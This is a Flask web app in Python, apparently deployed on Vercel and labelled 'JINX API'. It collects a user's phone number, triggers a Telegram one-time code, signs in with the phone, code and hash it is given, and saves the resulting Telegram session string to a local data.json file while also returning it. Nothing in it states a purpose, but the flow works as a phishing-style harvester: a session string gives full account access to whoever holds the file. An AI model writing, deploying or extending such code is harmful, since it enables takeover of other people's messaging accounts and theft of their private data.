# app.py — VERCEL (FIX 500 ERROR!)
from flask import Flask, request, jsonify
import os, json, traceback

app = Flask(__name__)

# BACA DARI FILE
def get_session_string():
    if os.path.exists('session.txt'):
        with open('session.txt', 'r') as f:
            return f.read().strip()
    return None

API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
SESSION_STRING = get_session_string()

# CEK
if not SESSION_STRING:
    @app.route('/', methods=['GET', 'POST'])
    def no_session():
        return jsonify({'error': 'session.txt KOSONG!'}), 500

from telethon.sync import TelegramClient
from telethon.sessions import StringSession

DATA_FILE = 'data.json'

def load():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {}

def save(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

@app.route('/', methods=['GET'])
def home():
    return """
    <h1 style="color:green;">JINX API JALAN!</h1>
    <form action="/send_code" method="post">
      <input name="phone" placeholder="+628..." required>
      <button>Kirim OTP</button>
    </form>
    """

@app.route('/send_code', methods=['POST'])
def send_code():
    phone = request.form.get('phone')
    if not phone:
        return jsonify({'success': False, 'error': 'no phone'})

    try:
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        client.connect()
        res = client.send_code_request(phone)
        client.disconnect()
        return jsonify({'success': True, 'hash': res.phone_code_hash})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone')
    code = request.form.get('code')
    hash_code = request.form.get('hash')
    if not all([phone, code, hash_code]):
        return jsonify({'success': False, 'error': 'missing'})

    try:
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        client.connect()
        client.sign_in(phone, code=code, phone_code_hash=hash_code)
        sess = client.session.save()
        data = load()
        data[phone] = {'session': sess}
        save(data)
        client.disconnect()
        return jsonify({'success': True, 'session': sess})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

if __name__ == "__main__":
    app.run()
